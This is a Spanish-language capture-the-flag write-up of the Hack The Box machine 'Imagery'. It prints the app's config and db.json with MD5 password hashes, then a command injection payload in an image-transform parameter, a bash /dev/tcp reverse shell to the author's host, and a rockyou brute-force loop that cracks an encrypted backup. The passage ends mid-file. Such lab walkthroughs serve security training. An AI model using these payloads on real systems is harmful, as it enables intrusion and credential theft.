<span class="n">ALLOWED_MEDIA_EXTENSIONS</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">jpg</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">jpeg</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">png</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">gif</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">bmp</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">tiff</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">pdf</span><span class="sh">'</span><span class="p">}</span>
<span class="n">ALLOWED_IMAGE_EXTENSIONS_FOR_TRANSFORM</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">jpg</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">jpeg</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">png</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">gif</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">bmp</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">tiff</span><span class="sh">'</span><span class="p">}</span>
<span class="n">ALLOWED_UPLOAD_MIME_TYPES</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">'</span><span class="s">image/jpeg</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">image/png</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">image/gif</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">image/bmp</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">image/tiff</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">application/pdf</span><span class="sh">'</span>
<span class="p">}</span>
<span class="n">ALLOWED_TRANSFORM_MIME_TYPES</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">'</span><span class="s">image/jpeg</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">image/png</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">image/gif</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">image/bmp</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">image/tiff</span><span class="sh">'</span>
<span class="p">}</span>
<span class="n">MAX_FILE_SIZE_MB</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">MAX_FILE_SIZE_BYTES</span> <span class="o">=</span> <span class="n">MAX_FILE_SIZE_MB</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span>

<span class="n">BYPASS_LOCKOUT_HEADER</span> <span class="o">=</span> <span class="sh">'</span><span class="s">X-Bypass-Lockout</span><span class="sh">'</span>
<span class="n">BYPASS_LOCKOUT_VALUE</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">getenv</span><span class="p">(</span><span class="sh">'</span><span class="s">CRON_BYPASS_TOKEN</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">default-secret-token-for-dev</span><span class="sh">'</span><span class="p">)</span>

<span class="n">FORBIDDEN_EXTENSIONS</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">php</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">php3</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">php4</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">php5</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">phtml</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">exe</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">sh</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">bat</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">cmd</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">js</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">jsp</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">asp</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">aspx</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">cgi</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">pl</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">py</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">dll</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">vbs</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">vbe</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">jse</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">wsf</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">wsh</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">psc1</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">ps1</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">jar</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">com</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">svg</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">xml</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">html</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">htm</span><span class="sh">'</span><span class="p">}</span>
<span class="n">BLOCKED_APP_PORTS</span> <span class="o">=</span> <span class="p">{</span><span class="mi">8080</span><span class="p">,</span> <span class="mi">8443</span><span class="p">,</span> <span class="mi">3000</span><span class="p">,</span> <span class="mi">5000</span><span class="p">,</span> <span class="mi">8888</span><span class="p">,</span> <span class="mi">53</span><span class="p">}</span>
<span class="n">OUTBOUND_BLOCKED_PORTS</span> <span class="o">=</span> <span class="p">{</span><span class="mi">80</span><span class="p">,</span> <span class="mi">8080</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">5000</span><span class="p">,</span> <span class="mi">8000</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">21</span><span class="p">}</span>
<span class="n">PRIVATE_IP_RANGES</span> <span class="o">=</span> <span class="p">[</span>
    <span class="n">ipaddress</span><span class="p">.</span><span class="nf">ip_network</span><span class="p">(</span><span class="sh">'</span><span class="s">127.0.0.0/8</span><span class="sh">'</span><span class="p">),</span>
    <span class="n">ipaddress</span><span class="p">.</span><span class="nf">ip_network</span><span class="p">(</span><span class="sh">'</span><span class="s">172.0.0.0/12</span><span class="sh">'</span><span class="p">),</span>
    <span class="n">ipaddress</span><span class="p">.</span><span class="nf">ip_network</span><span class="p">(</span><span class="sh">'</span><span class="s">10.0.0.0/8</span><span class="sh">'</span><span class="p">),</span>
    <span class="n">ipaddress</span><span class="p">.</span><span class="nf">ip_network</span><span class="p">(</span><span class="sh">'</span><span class="s">169.254.0.0/16</span><span class="sh">'</span><span class="p">)</span>
<span class="p">]</span>
<span class="n">AWS_METADATA_IP</span> <span class="o">=</span> <span class="n">ipaddress</span><span class="p">.</span><span class="nf">ip_address</span><span class="p">(</span><span class="sh">'</span><span class="s">169.254.169.254</span><span class="sh">'</span><span class="p">)</span>
<span class="n">IMAGEMAGICK_CONVERT_PATH</span> <span class="o">=</span> <span class="sh">'</span><span class="s">/usr/bin/convert</span><span class="sh">'</span>
<span class="n">EXIFTOOL_PATH</span> <span class="o">=</span> <span class="sh">'</span><span class="s">/usr/bin/exiftool</span><span class="sh">'</span>
</pre></td></tr></tbody></table></code></div></div>

<p>En config.py al principio del script vemos que esta cargando un <code class="language-plaintext highlighter-rouge">db.json</code>, quizas se trate de alguna base de datos</p>

<p>db.json</p>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
    </span><span class="nl">"users"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"admin@imagery.htb"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"5d9c1d507a3f76af1e5c97a3ad1eaa31"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"isAdmin"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
            </span><span class="nl">"displayId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"a1b2c3d4"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"login_attempts"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
            </span><span class="nl">"isTestuser"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="nl">"failed_login_attempts"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
            </span><span class="nl">"locked_until"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"testuser@imagery.htb"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2c65c8d7bfbca32a3ed42596192384f6"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"isAdmin"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="nl">"displayId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"e5f6g7h8"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"login_attempts"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
            </span><span class="nl">"isTestuser"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
            </span><span class="nl">"failed_login_attempts"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
            </span><span class="nl">"locked_until"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">],</span><span class="w">
    </span><span class="nl">"images"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
    </span><span class="nl">"image_collections"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"My Images"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Unsorted"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Converted"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Transformed"</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">],</span><span class="w">
    </span><span class="nl">"bug_reports"</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>En db.json encontramos hashes que al parecer son md5, un algoritmo de cifrado extremadamente débil. Vamos a intentar crackearlo con crackstation via web</p>

<p><a href="/assets/img/htb-writeup-imagery/imagery26.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery26.png" alt="" loading="lazy"></a></p>

<p>Solo pudimos crackear el hash del usuario <code class="language-plaintext highlighter-rouge">testuser</code>, este lo vimos en el panel de admin. Quiero hacerme la idea que el puede tener alguna funcionalidad extra para la subida y edicion de imagenes.</p>

<p>Vamos a iniciar sesion como <code class="language-plaintext highlighter-rouge">testuser</code></p>

<p><a href="/assets/img/htb-writeup-imagery/imagery27.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery27.png" alt="" loading="lazy"></a></p>

<p>Aparece un boton nuevo <code class="language-plaintext highlighter-rouge">Manage Groups</code>.</p>

<p>Si subimos una imagen como lo hicimos anteriormente, se nos desbloquean mas funcionalidades como el procesamiento de imagenes</p>

<p><a href="/assets/img/htb-writeup-imagery/imagery28.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery28.png" alt="" loading="lazy"></a></p>

<h3 id="inyeccion-de-comandos-command-injection"><span class="me-2">Inyeccion de Comandos (Command Injection)</span><a href="#inyeccion-de-comandos-command-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>Edit Details
    <ul>
      <li>Solo modifica la descripcion y nombre de la imagen</li>
    </ul>
  </li>
  <li>Convert Format
    <ul>
      <li>Puede convertir el formato de imagen a jpg, bmp, gif, pdf, etc.</li>
    </ul>
  </li>
  <li>Transform Image
    <ul>
      <li>Vale la pena probarlo, ya que puede recortar , ajustar el color y rotar la imagen. Como por ejemplo se puede modificar el tamaño de la imagen.</li>
    </ul>
  </li>
</ul>

<p><a href="/assets/img/htb-writeup-imagery/imagery29.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery29.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/htb-writeup-imagery/imagery30.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery30.png" alt="" loading="lazy"></a></p>

<p>Si nos detenemos un poco en esta parte para recordar todo lo que obtuvimos hasta ahora, reuniendo la informacion observamos que en <code class="language-plaintext highlighter-rouge">config.py</code> hay una parte del script que nombra <code class="language-plaintext highlighter-rouge">ImageMagick</code>, este es una herramienta de edicion de imagenes del lado de backend.</p>

<p>Lo siguiente seria interceptar la peticion cuando realizamos una accion en <code class="language-plaintext highlighter-rouge">Transform Image</code>.</p>

<p><a href="/assets/img/htb-writeup-imagery/imagery31.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery31.png" alt="" loading="lazy"></a></p>

<p>Aqui se puede probar muchas cosas, creanme que probe de todo. Pero en uno de los parametros como <code class="language-plaintext highlighter-rouge">x</code> se puede ejecutar comandos de la siguiente manera:</p>

<p><a href="/assets/img/htb-writeup-imagery/imagery32.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery32.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/htb-writeup-imagery/imagery33.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery33.png" alt="" loading="lazy"></a></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="s2">"x"</span>:<span class="s2">"0; bash -c 'ping -c 1 10.10.16.8' #"</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Recibiendo con exito el ping y comando que ejecutamos en la maquina. Solo queda ganar acceso al sistema con alguna reverse shell.</p>

<p>En la web se crea un apartado con la imagen que editamos (Transformed)</p>

<p><a href="/assets/img/htb-writeup-imagery/imagery34.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery34.png" alt="" loading="lazy"></a></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.16.8/443 0&gt;&amp;1'</span>
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/htb-writeup-imagery/imagery35.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery35.png" alt="" loading="lazy"></a></p>

<p>Estamos dentro!!!!!! Conseguimos una shell!!!!</p>

<h2 id="escalada-de-privilegios"><span class="me-2">Escalada de Privilegios</span><a href="#escalada-de-privilegios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="shell-como-web"><span class="me-2">Shell como Web</span><a href="#shell-como-web" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Enumerando primero las tareas cron o tareas programadas que se ejecutan a nivel de sistema en intervalos regulares de tiempo, nos encontramos con esto:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre>web@Imagery:~/web<span class="nv">$ </span>crontab <span class="nt">-l</span>
<span class="c"># Edit this file to introduce tasks to be run by cron.</span>
<span class="c"># </span>
<span class="c"># Each task to run has to be defined through a single line</span>
<span class="c"># indicating with different fields when the task will be run</span>
<span class="c"># and what command to run for the task</span>
<span class="c"># </span>
<span class="c"># To define the time you can provide concrete values for</span>
<span class="c"># minute (m), hour (h), day of month (dom), month (mon),</span>
<span class="c"># and day of week (dow) or use '*' in these fields (for 'any').</span>
<span class="c"># </span>
<span class="c"># Notice that tasks will be started based on the cron's system</span>
<span class="c"># daemon's notion of time and timezones.</span>
<span class="c"># </span>
<span class="c"># Output of the crontab jobs (including errors) is sent through</span>
<span class="c"># email to the user the crontab file belongs to (unless redirected).</span>
<span class="c"># </span>
<span class="c"># For example, you can run a backup of all your user accounts</span>
<span class="c"># at 5 a.m every week with:</span>
<span class="c"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span>
<span class="c"># </span>
<span class="c"># For more information see the manual pages of crontab(5) and cron(8)</span>
<span class="c"># </span>
<span class="c"># m h  dom mon dow   command</span>
<span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> python3 /home/web/web/bot/admin.py
</pre></td></tr></tbody></table></code></div></div>

<p>Existe una tarea <code class="language-plaintext highlighter-rouge">0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</code> que esta deshabilitada pero quizas haya generado copias de seguridad en su tiempo.</p>

<p>En la carpeta <code class="language-plaintext highlighter-rouge">/var/backups</code> nos encontramos con mucha informacion que almacena linux de manera regular. Pero cuando nos dirijiamos a dicha carpeta, en el camino nos encontramos con</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre>web@Imagery:/var<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 48
drwxr-xr-x  2 root root   4096 Sep 22 18:56 backup
drwxr-xr-x  3 root root   4096 Sep 23 16:27 backups
drwxr-xr-x 17 root root   4096 Sep 22 18:56 cache
drwxrwsrwt  2 root root   4096 Sep 22 18:56 crash
drwxr-xr-x 45 root root   4096 Sep 22 19:11 lib
drwxrwsr-x  2 root staff  4096 Sep 22 18:56 <span class="nb">local
</span>lrwxrwxrwx  1 root root      9 Oct  7  2024 lock -&gt; /run/lock
drwxrwxr-x  8 root syslog 4096 Oct 27 12:56 log
drwxrwsr-x  2 root mail   4096 Sep 22 18:56 mail
drwxr-xr-x  2 root root   4096 Sep 22 18:56 opt
lrwxrwxrwx  1 root root      4 Oct  7  2024 run -&gt; /run
drwxr-xr-x  8 root root   4096 Sep 22 18:56 snap
drwxr-xr-x  4 root root   4096 Sep 22 18:56 spool
drwxrwxrwt  9 root root   4096 Oct 27 13:09 tmp
web@Imagery:/var<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>web<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>web<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>web<span class="o">)</span>
web@Imagery:/var<span class="nv">$ </span><span class="nb">cd </span>backup
web@Imagery:/var/backup<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 22516
<span class="nt">-rw-rw-r--</span> 1 root root 23054471 Aug  6  2024 web_20250806_120723.zip.aes
</pre></td></tr></tbody></table></code></div></div>

<p>Un archivo zip.aes, a simple viste tiene pinta de que vamos a luchar con descifrarlo.</p>

<p>Como primera medida vamos a traerlo a nuestra maquina para tratar de abrirlo</p>

<ul>
  <li>ZIP.AES
    <ul>
      <li>web_20250806_120723.zip.aes</li>
    </ul>
  </li>
</ul>

<p>Para desencriptar este archivo vamos a tener que instalar <a href="https://github.com/marcobellaccini/pyAesCrypt">pyAesCrypt</a></p>

<p>Este oneliner va a probar diferentes combinaciones que toma del diccionario <code class="language-plaintext highlighter-rouge">rockyou.txt</code>.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="k">while </span><span class="nv">IFS</span><span class="o">=</span> <span class="nb">read</span> <span class="nt">-r</span> p<span class="p">;</span> <span class="k">do </span>pyAesCrypt <span class="nt">-d</span> web_20250806_120723.zip.aes <span class="nt">-o</span> /tmp/out.zip <span class="nt">-p</span> <span class="s2">"</span><span class="nv">$p</span><span class="s2">"</span> <span class="o">&gt;</span>/dev/null 2&gt;&amp;1 <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"[+] Password: </span><span class="nv">$p</span><span class="s2">"</span> <span class="o">&amp;&amp;</span> <span class="nb">mv</span> /tmp/out.zip web_20250806_120723.zip.aes <span class="o">&amp;&amp;</span> <span class="nb">break</span><span class="p">;</span> <span class="k">done</span> &lt; /usr/share/wordlists/rockyou.txt
<span class="o">[</span>+] Password: bestfriends
</pre></td></tr></tbody></table></code></div></div>

<p>Esta es la contraseña para abrir el archivo, este zip no se abre de una manera normal como haciendo un <code class="language-plaintext highlighter-rouge">unzip</code>. Se descomprime pasandole alguno de los scripts que tiene el <a href="https://github.com/marcobellaccini/pyAesCrypt">pyAesCrypt</a></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>❯ <span class="nb">pwd</span>
/home/mrincreible/HTB/imagery/decrypt/web_zip/web
❯ <span class="nb">ls</span> <span class="nt">-l</span>
drwxr-xr-x root root 4.0 KB Mon Oct 27 16:16:21 2025  __pycache__
drwxr-xr-x root root 4.0 KB Mon Oct 27 16:16:22 2025  <span class="nb">env
</span>drwxr-xr-x root root 4.0 KB Mon Oct 27 16:16:21 2025  system_logs
drwxr-xr-x root root 4.0 KB Mon Oct 27 16:16:21 2025  templates
.rw-rw-r-- root root 9.6 KB Tue Aug  5 08:56:42 2025  api_admin.py
.rw-rw-r-- root root 6.2 KB Tue Aug  5 08:56:54 2025  api_auth.py
.rw-rw-r-- root root  12 KB Tue Aug  5 08:57:06 2025  api_edit.py
.rw-rw-r-- root root 8.9 KB Tue Aug  5 08:57:20 2025  api_manage.py
.rw-rw-r-- root root 840 B  Tue Aug  5 08:58:18 2025  api_misc.py
.rw-rw-r-- root root  12 KB Tue Aug  5 08:58:38 2025  api_upload.py
.rw-rw-r-- root root 1.9 KB Tue Aug  5 15:21:24 2025  app.py
.rw-rw-r-- root root 1.8 KB Tue Aug  5 08:59:48 2025  config.py
.rw-rw-r-- root root 1.5 KB Wed Aug  6 12:07:02 2025  db.json
.rw-rw-r-- root root 3.9 KB Tue Aug  5 09:00:20 2025  utils.py
</pre></td></tr></tbody></table></code></div></div>

<p>Este archivo contiene un backup del proyecto que corre por el puerto 8000, es decir la aplicacion web que logramos vulnerar con un <code class="language-plaintext highlighter-rouge">Command Injection</code></p>

<p>En db.json existen otros usuarios que no conocemos, pero si estan a nivel de sistema linux.</p>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
    </span><span class="nl">"users"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"admin@imagery.htb"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"5d9c1d507a3f76af1e5c97a3ad1eaa31"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"displayId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"f8p10uw0"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"isTestuser"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="nl">"isAdmin"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
            </span><span class="nl">"failed_login_attempts"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
            </span><span class="nl">"locked_until"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"testuser@imagery.htb"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2c65c8d7bfbca32a3ed42596192384f6"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"displayId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"8utz23o5"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"isTestuser"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
            </span><span class="nl">"isAdmin"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="nl">"failed_login_attempts"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
            </span><span class="nl">"locked_until"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"mark@imagery.htb"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"01c3d2e5bdaf6134cec0a367cf53e535"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"displayId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"868facaf"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"isAdmin"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="nl">"failed_login_attempts"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
            </span><span class="nl">"locked_until"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
            </span><span class="nl">"isTestuser"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"web@imagery.htb"</span><span class="p">,</span><span class="w">
